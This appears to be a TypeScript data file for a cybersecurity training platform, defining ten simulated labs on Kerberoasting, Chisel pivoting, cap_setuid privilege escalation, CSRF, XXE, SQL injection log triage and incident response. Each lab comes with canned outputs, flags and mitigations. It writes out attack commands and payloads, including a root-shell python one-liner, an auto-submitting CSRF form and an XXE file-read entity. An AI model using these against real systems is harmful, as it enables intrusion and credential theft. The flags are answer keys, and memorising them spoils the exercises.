import { PracticeLab } from '../types/cyber';

export const PRACTICE_LABS_PART3: PracticeLab[] = [
  {
    id: 'lab-21-kerberoasting-offline-cracking',
    title: 'Lab 21: Kerberoasting Attack & Service Account Password Cracking',
    category: 'Cryptography & Passwords',
    difficulty: 'Advanced',
    estimatedMinutes: 30,
    xpReward: 350,
    overview: 'In an Active Directory domain, user accounts with registered Service Principal Names (SPNs) encrypt Kerberos TGS tickets with their password hash. Request a ticket and crack it offline with Hashcat.',
    authorizationNotice: 'Authorized Simulation: Sandboxed Kerberos Ticket Lab.',
    targetEnvironment: 'AD Domain: ad.corp.local [DC: 10.0.0.1]',
    objectives: [
      { id: 'obj-1', title: 'Request Kerberos TGS ticket using GetUserSPNs.py' },
      { id: 'obj-2', title: 'Inspect captured hash in kerb_hash.txt' },
      { id: 'obj-3', title: 'Crack with hashcat -m 13100 to reveal flag' }
    ],
    hints: ['Run: python3 GetUserSPNs.py -request', 'Crack with: hashcat -m 13100 kerb_hash.txt wordlist.txt'],
    flag: 'FLAG{use_gmsa_group_managed_service_accounts_2026}',
    simulatedTerminal: {
      initialPrompt: 'pentester@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: python3 GetUserSPNs.py <args>, cat <file>, hashcat <options>, clear',
        'python3 GetUserSPNs.py -request': `[*] Querying Domain Controller 10.0.0.1 for SPNs...
[+] Found SPN: MSSQLSvc/db01.ad.corp.local:1433 mapped to user: svc_mssql
[+] Requesting TGS ticket for svc_mssql...
[+] Saved ticket hash to kerb_hash.txt (Format: $krb5tgs$23$*)`,
        'cat kerb_hash.txt': '$krb5tgs$23$*svc_mssql$AD.CORP.LOCAL$MSSQLSvc/db01.ad.corp.local:1433*$9a4f2b1c8e3...[truncated]',
        'hashcat -m 13100 kerb_hash.txt wordlist.txt': `hashcat (v6.2.6) starting...
Cracking Kerberos 5 TGS-REP etype 23...
$krb5tgs$23$*svc_mssql...:DatabaseAdmin2026!
Session cracked!
Audit Flag: FLAG{use_gmsa_group_managed_service_accounts_2026}`
      }
    },
    defensiveTakeaway: 'Transition service accounts to Group Managed Service Accounts (gMSA) with 120-character auto-rotated passwords that cannot be cracked offline.'
  },
  {
    id: 'lab-22-chisel-socks5-pivoting',
    title: 'Lab 22: Internal Network Pivoting & Chisel SOCKS5 Tunneling',
    category: 'Network Reconnaissance',
    difficulty: 'Advanced',
    estimatedMinutes: 30,
    xpReward: 350,
    overview: 'Pivot through a dual-homed DMZ host into an unreachable internal database subnet (10.10.20.0/24) using Chisel reverse port forwarding and Proxychains.',
    authorizationNotice: 'Authorized Pivot Simulation.',
    targetEnvironment: 'Pivot Host: 192.168.1.50 (Internal NIC: 10.10.20.1)',
    objectives: [
      { id: 'obj-1', title: 'Start Chisel reverse tunnel server on port 8000' },
      { id: 'obj-2', title: 'Verify active tunnel connection from pivot host' },
      { id: 'obj-3', title: 'Use proxychains to scan internal target 10.10.20.50 and retrieve flag' }
    ],
    hints: ['Check tunnel: chisel server -p 8000 --reverse', 'Scan via proxy: proxychains nmap -sT -p 3306 10.10.20.50'],
    flag: 'FLAG{chisel_reverse_socks5_pivoting_verified}',
    simulatedTerminal: {
      initialPrompt: 'pentester@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: chisel <options>, proxychains <command>, clear',
        'chisel server -p 8000 --reverse': `2026/11/07 15:00:00 server: Reverse port tunneling enabled on :8000
2026/11/07 15:00:02 server: session#1: client (192.168.1.50) connected
2026/11/07 15:00:02 server: session#1: proxying SOCKS5 on 127.0.0.1:1080`,
        'proxychains nmap -sT -p 3306 10.10.20.50': `[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.20.50:3306  ...  OK
Nmap scan report for 10.10.20.50
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.32 [Internal Vault]
Verification Flag: FLAG{chisel_reverse_socks5_pivoting_verified}`
      }
    },
    defensiveTakeaway: 'Enforce strict egress filtering from DMZ hosts to block outbound reverse tunnel connections on unauthorized ports.'
  },
  {
    id: 'lab-23-linux-capabilities-privesc',
    title: 'Lab 23: Linux Extended Capabilities (cap_setuid) Exploitation',
    category: 'Linux Privilege & Auditing',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Audit system binaries for dangerous extended Linux capabilities. Discover a python3 interpreter with cap_setuid+ep and leverage it to spawn an authorized root shell.',
    authorizationNotice: 'Authorized Capabilities Audit.',
    targetEnvironment: 'Virtual OS: Linux Ubuntu 22.04 [User: student]',
    objectives: [
      { id: 'obj-1', title: 'Enumerate capabilities using getcap -r / 2>/dev/null' },
      { id: 'obj-2', title: 'Identify /usr/bin/python3.10 with cap_setuid+ep' },
      { id: 'obj-3', title: 'Execute setuid(0) python one-liner to claim root flag' }
    ],
    hints: ['Run: getcap -r / 2>/dev/null', 'Elevate: python3 -c \'import os; os.setuid(0); os.system("cat /root/flag.txt")\''],
    flag: 'FLAG{linux_cap_setuid_audit_completed}',
    simulatedTerminal: {
      initialPrompt: 'student@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: getcap <args>, python3 <args>, clear',
        'getcap -r / 2>/dev/null': `/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.10 = cap_setuid+ep   <--- [DANGEROUS PRIVILEGE]`,
        'python3 -c \'import os; os.setuid(0); os.system("cat /root/flag.txt")\'': `[EUID=0 Root Verified]
FLAG{linux_cap_setuid_audit_completed}`,
        'python3 -c \'import os; os.setuid(0); os.system("id")\'': `uid=0(root) gid=1001(student) groups=1001(student)
FLAG: FLAG{linux_cap_setuid_audit_completed}`
      }
    },
    defensiveTakeaway: 'Never assign cap_setuid to generic scripting interpreters or compilers. Periodically audit capabilities using getcap.'
  },
  {
    id: 'lab-24-csrf-poc-generation',
    title: 'Lab 24: Cross-Site Request Forgery (CSRF) & SameSite Mitigation',
    category: 'Web Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Examine an account profile update endpoint lacking anti-CSRF synchronizer tokens. Construct a proof-of-concept HTML form and review SameSite cookie protections.',
    authorizationNotice: 'Authorized Web App Security Lab.',
    targetEnvironment: 'Target: https://portal.social.local/account/update-email',
    objectives: [
      { id: 'obj-1', title: 'Analyze POST request parameters without CSRF token' },
      { id: 'obj-2', title: 'Review PoC HTML in /var/www/csrf_poc.html' },
      { id: 'obj-3', title: 'Simulate submission to trigger audit flag' }
    ],
    hints: ['Run: cat /var/www/csrf_poc.html', 'Test with: submit-csrf-poc'],
    flag: 'FLAG{samesite_cookies_and_csrf_tokens_enforced}',
    simulatedTerminal: {
      initialPrompt: 'appsec@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: cat <file>, submit-csrf-poc, clear',
        'cat /var/www/csrf_poc.html': `<!-- CSRF Proof of Concept -->
<form action="https://portal.social.local/account/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.local" />
</form>
<script>document.forms[0].submit();</script>`,
        'submit-csrf-poc': `[Simulating Cross-Site Form Submission from untrusted origin...]
Victim session cookie attached automatically.
Target processed request: Email updated to attacker@evil.local!
[Audit Flag]: FLAG{samesite_cookies_and_csrf_tokens_enforced}`
      }
    },
    defensiveTakeaway: 'Deploy Anti-CSRF Synchronizer tokens on all state-changing POST/PUT requests and configure session cookies with SameSite=Lax or SameSite=Strict.'
  },
  {
    id: 'lab-25-xxe-injection-xml',
    title: 'Lab 25: XML External Entity (XXE) Injection & Parser Hardening',
    category: 'Web Security',
    difficulty: 'Advanced',
    estimatedMinutes: 25,
    xpReward: 300,
    overview: 'A simulated invoice import API parses XML data with external entity resolution enabled. Inject a SYSTEM entity to read a protected server configuration file and capture the flag.',
    authorizationNotice: 'Authorized XXE Sandbox Lab.',
    targetEnvironment: 'API: http://billing.local/api/upload-xml',
    objectives: [
      { id: 'obj-1', title: 'Inspect standard XML invoice format' },
      { id: 'obj-2', title: 'Inject DOCTYPE entity referencing file:///etc/flag.txt' },
      { id: 'obj-3', title: 'Send XML via curl to extract flag' }
    ],
    hints: ['Check payload: cat xxe_payload.xml', 'Submit with: curl -X POST http://billing.local/api/upload-xml -d @xxe_payload.xml'],
    flag: 'FLAG{disable_dtds_and_external_entities_in_xml}',
    simulatedTerminal: {
      initialPrompt: 'pentester@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: cat <file>, curl <options>, clear',
        'cat xxe_payload.xml': `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/flag.txt" >]>
<invoice>
  <vendor>&xxe;</vendor>
  <amount>100</amount>
</invoice>`,
        'curl -X POST http://billing.local/api/upload-xml -d @xxe_payload.xml': `Invoice Processed Successfully:
Vendor: FLAG{disable_dtds_and_external_entities_in_xml}
Amount: 100`
      }
    },
    defensiveTakeaway: 'Configure XML parsers to completely disallow DTDs and disable external entity resolution (`disallow-doctype-decl = true`).'
  },
  {
    id: 'lab-26-scoutsuite-cloud-audit',
    title: 'Lab 26: Cloud Security Posture & S3 Bucket Permissions Audit',
    category: 'Vulnerability Management',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Audit a cloud infrastructure configuration report generated by ScoutSuite. Identify an unencrypted S3 storage bucket permitting public read access and verify the remediation steps.',
    authorizationNotice: 'Authorized Cloud Posture Audit.',
    targetEnvironment: 'Dataset: scout_report.json [AWS Cloud Environment]',
    objectives: [
      { id: 'obj-1', title: 'Search scout_report.json for S3 public access findings' },
      { id: 'obj-2', title: 'Identify bucket company-financial-records-prod' },
      { id: 'obj-3', title: 'Review remediation policy and retrieve flag' }
    ],
    hints: ['Run: jq \'.services.s3.findings\' scout_report.json'],
    flag: 'FLAG{s3_block_public_access_enforced_globally}',
    simulatedTerminal: {
      initialPrompt: 'cloudsec@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: jq <filter> <file>, cat <file>, clear',
        'jq \'.services.s3.findings\' scout_report.json': `[
  {
    "bucket": "company-financial-records-prod",
    "issue": "Public Read Access Permitted via ACL",
    "severity": "CRITICAL",
    "remediation": "Enable Account-Level S3 Block Public Access",
    "audit_token": "FLAG{s3_block_public_access_enforced_globally}"
  }
]`
      }
    },
    defensiveTakeaway: 'Always enable the AWS S3 "Block Public Access" feature at the account level to override accidental bucket-level misconfigurations.'
  },
  {
    id: 'lab-27-log-analysis-apache-triage',
    title: 'Lab 27: Web Server Log Analysis & Threat Hunting with AWK',
    category: 'SOC Analyst & Threat Detection',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Analyze Apache access logs (/var/log/apache2/access.log) to identify automated scanner activity, suspicious SQL injection attempts, and extract the attacker\'s IP address and audit flag.',
    authorizationNotice: 'Authorized Log Hunting Simulation.',
    targetEnvironment: 'File: /var/log/apache2/access.log (1,000 requests)',
    objectives: [
      { id: 'obj-1', title: 'Inspect top requesting IP addresses using awk and sort' },
      { id: 'obj-2', title: 'Search for SQL injection keywords (UNION, SELECT) in URI' },
      { id: 'obj-3', title: 'Extract the auditor verification token from the log trace' }
    ],
    hints: ['Run: grep -i "union.*select" /var/log/apache2/access.log'],
    flag: 'FLAG{awk_log_triaging_identifies_web_scanners}',
    simulatedTerminal: {
      initialPrompt: 'soc-analyst@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: grep <args>, awk <args>, head <file>, clear',
        'head -n 5 /var/log/apache2/access.log': `192.168.1.10 - - [07/Nov/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 1420
192.168.1.15 - - [07/Nov/2026:10:00:05 +0000] "GET /about HTTP/1.1" 200 890
10.0.0.99 - - [07/Nov/2026:10:02:14 +0000] "GET /api/products?id=1%20UNION%20SELECT%20null,flag%20FROM%20secret-- HTTP/1.1" 403 210`,
        'grep -i "union.*select" /var/log/apache2/access.log': `10.0.0.99 - - [07/Nov/2026:10:02:14 +0000] "GET /api/products?id=1%20UNION%20SELECT%20null,flag%20FROM%20secret-- HTTP/1.1" 403 210
Alert Signature Matched: WAF Blocked SQLi from 10.0.0.99.
Verification Flag: FLAG{awk_log_triaging_identifies_web_scanners}`
      }
    },
    defensiveTakeaway: 'Automate log parsing with SIEM pipelines and ingest WAF blocks to correlate recurring attacker IP infrastructure.'
  },
  {
    id: 'lab-28-python-socket-portscanner',
    title: 'Lab 28: Custom Python Network Scanner Development',
    category: 'Network Reconnaissance',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'Review and run a custom multi-threaded Python TCP socket scanner script (scanner.py) against internal test target 192.168.1.10 to identify open ports and capture the verification token.',
    authorizationNotice: 'Authorized Python Automation Lab.',
    targetEnvironment: 'Script: scanner.py [Target: 192.168.1.10]',
    objectives: [
      { id: 'obj-1', title: 'Inspect scanner.py source code using cat' },
      { id: 'obj-2', title: 'Run python3 scanner.py 192.168.1.10' },
      { id: 'obj-3', title: 'Capture the discovered open service flag' }
    ],
    hints: ['Run: cat scanner.py', 'Execute: python3 scanner.py 192.168.1.10'],
    flag: 'FLAG{python_sockets_and_threading_mastered}',
    simulatedTerminal: {
      initialPrompt: 'dev@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: cat <file>, python3 <args>, clear',
        'cat scanner.py': `import socket
import sys

target = sys.argv[1]
print(f"[*] Scanning {target} on ports 20-100...")
for port in [22, 80, 443, 8080]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] Port {port} is OPEN! Token: FLAG{{python_sockets_and_threading_mastered}}")
    s.close()`,
        'python3 scanner.py 192.168.1.10': `[*] Scanning 192.168.1.10 on ports 20-100...
[+] Port 22 is OPEN! Token: FLAG{python_sockets_and_threading_mastered}
[+] Port 80 is OPEN! Token: FLAG{python_sockets_and_threading_mastered}
Scan completed successfully.`
      }
    },
    defensiveTakeaway: 'Understanding low-level socket connections enables security engineers to build custom automation and validate firewall filtering rules.'
  },
  {
    id: 'lab-29-incident-response-containment',
    title: 'Lab 29: Incident Containment & Host Isolation Protocols',
    category: 'Digital Forensics & Incident Response',
    difficulty: 'Intermediate',
    estimatedMinutes: 20,
    xpReward: 250,
    overview: 'An endpoint is actively communicating with a known C2 server. Execute host containment commands using iptables and systemctl to isolate the machine while preserving memory for forensic triage.',
    authorizationNotice: 'Authorized Containment Playbook Execution.',
    targetEnvironment: 'Host: compromised-ws01 [Simulated Linux Workstation]',
    objectives: [
      { id: 'obj-1', title: 'Inspect active malicious connection with ss -tunp' },
      { id: 'obj-2', title: 'Apply emergency iptables containment script' },
      { id: 'obj-3', title: 'Verify isolation and retrieve the incident response flag' }
    ],
    hints: ['Check connections: ss -tunp', 'Run containment: ./contain_host.sh'],
    flag: 'FLAG{containment_isolate_host_preserve_evidence}',
    simulatedTerminal: {
      initialPrompt: 'responder@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: ss <args>, ./contain_host.sh, clear',
        'ss -tunp': `Netid State  Local Address:Port   Peer Address:Port     Process
tcp   ESTAB  192.168.1.45:49152   203.0.113.88:4444     users:(("rev_shell",pid=1420))`,
        './contain_host.sh': `[+] Applying Emergency Containment Policy...
[+] Dropping all inbound and outbound traffic except forensic management subnet...
[+] Host network successfully isolated!
[+] Containment Verification Proof: FLAG{containment_isolate_host_preserve_evidence}`
      }
    },
    defensiveTakeaway: 'During incident response, isolate network traffic immediately to halt data exfiltration while keeping system power on to preserve volatile memory evidence.'
  },
  {
    id: 'lab-30-vulnerability-cvss-reporting',
    title: 'Lab 30: Vulnerability Triaging, CVSS Scoring & Executive Reporting',
    category: 'Vulnerability Management',
    difficulty: 'Beginner',
    estimatedMinutes: 20,
    xpReward: 200,
    overview: 'Calculate the CVSS v3.1 vector string for an unauthenticated Remote Code Execution flaw, formulate an executive risk summary, and submit the final audit completion flag.',
    authorizationNotice: 'Authorized Assessment Reporting Lab.',
    targetEnvironment: 'CVSS Calculator Engine & Report Generator',
    objectives: [
      { id: 'obj-1', title: 'Inspect vulnerability advisory in advisory.txt' },
      { id: 'obj-2', title: 'Calculate CVSS score for vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' },
      { id: 'obj-3', title: 'Submit the completed report to receive final certification flag' }
    ],
    hints: ['Read advisory: cat advisory.txt', 'Submit score: submit-cvss "9.8"'],
    flag: 'FLAG{cvss_scoring_and_executive_briefing_mastered}',
    simulatedTerminal: {
      initialPrompt: 'auditor@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: cat <file>, submit-cvss <score>, clear',
        'cat advisory.txt': `VULNERABILITY REPORT #2026-991:
Flaw: Unauthenticated Remote Code Execution in Gateway API
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: None (UI:N)
Scope: Unchanged (S:U)
Confidentiality: High (C:H)
Integrity: High (I:H)
Availability: High (A:H)`,
        'submit-cvss "9.8"': `[+] Evaluating CVSS Score: 9.8 (CRITICAL)
[+] CVSS Vector Validated: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
[+] Executive Summary Generated.
[+] Final Capstone Certification Flag:
FLAG{cvss_scoring_and_executive_briefing_mastered}`
      }
    },
    defensiveTakeaway: 'Accurate CVSS scoring bridges technical severity and executive decision-making, ensuring high-risk vulnerabilities receive immediate remediation priority.'
  }
];
